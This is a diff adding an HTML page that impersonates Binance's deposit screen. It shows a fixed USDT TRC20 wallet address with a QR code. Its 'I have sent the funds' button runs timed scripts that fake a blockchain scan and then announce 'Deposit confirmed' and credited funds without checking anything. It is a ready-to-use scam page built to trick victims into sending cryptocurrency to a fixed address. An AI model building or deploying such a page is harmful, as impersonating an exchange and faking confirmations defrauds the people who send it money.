@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Binance - Deposit</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font:15px/1.5 -apple-system,Roboto,sans-serif;background:#0b0e11;color:#eaecef;padding:16px}
+header{display:flex;align-items:center;gap:10px;padding:14px 0;border-bottom:1px solid #2b3139;margin-bottom:20px}
+.logo{width:28px;height:28px;background:#f0b90b;border-radius:6px;display:grid;place-items:center;font-weight:800;color:#0b0e11}
+h1{font-size:17px;font-weight:600}
+.card{background:#1e2329;border:1px solid #2b3139;border-radius:12px;padding:18px}
+label{display:block;font-size:12px;color:#848e9c;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
+select{width:100%;background:#0b0e11;border:1px solid #2b3139;color:#eaecef;border-radius:8px;padding:11px;font-size:14px;margin-bottom:16px}
+.qr{background:#fff;padding:10px;border-radius:10px;width:190px;margin:0 auto 16px;display:block}
+.addr{font-family:monospace;font-size:12.5px;word-break:break-all;background:#0b0e11;border:1px solid #2b3139;padding:11px;border-radius:8px;margin-bottom:10px}
+button{width:100%;background:#f0b90b;color:#0b0e11;border:0;border-radius:8px;padding:13px;font-weight:700;font-size:15px;cursor:pointer}
+.note{font-size:12.5px;color:#848e9c;margin-top:14px;line-height:1.6}
+.note b{color:#f0b90b}
+#status{display:none;text-align:center;padding:26px 0}
+.spin{width:34px;height:34px;border:3px solid #2b3139;border-top-color:#f0b90b;border-radius:50%;margin:0 auto 14px;animation:s 1s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<header><div class="logo">B</div><h1>Binance</h1></header>
+
+<div class="card" id="form">
+  <label>Coin</label>
+  <select><option>USDT</option><option>BTC</option><option>ETH</option></select>
+
+  <label>Network</label>
+  <select><option>TRC20 (Tron)</option><option>BEP20 (BSC)</option></select>
+
+  <label>Deposit address</label>
+  <div class="addr" id="addr">TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ" alt="QR">
+
+  <button onclick="copy()">Copy address</button>
+  <button style="margin-top:10px;background:#2b3139;color:#eaecef" onclick="start()">I have sent the funds</button>
+
+  <p class="note">
+    <b>Send only USDT via TRC20</b> to this address.<br>
+    Minimum deposit: 10 USDT. Credits after 1 network confirmation.<br>
+    Sending any other coin or network may result in permanent loss.
+  </p>
+</div>
+
+<div id="status">
+  <div class="spin"></div>
+  <div id="msg">Scanning blockchain…</div>
+</div>
+
+<script>
+function copy(){
+  navigator.clipboard.writeText(document.getElementById('addr').innerText);
+  event.target.innerText='Copied';
+  setTimeout(function(){event.target.innerText='Copy address'},1500);
+}
+function start(){
+  document.getElementById('form').style.display='none';
+  document.getElementById('status').style.display='block';
+  setTimeout(function(){document.getElementById('msg').innerText='1 confirmation pending…'},4000);
+  setTimeout(function(){document.getElementById('msg').innerHTML='<b style="color:#0ecb81">Deposit confirmed</b><br><span style="color:#848e9c;font-size:13px">Funds credited to your spot wallet</span>'},9000);
+}
+</script>
+</body>
+</html>
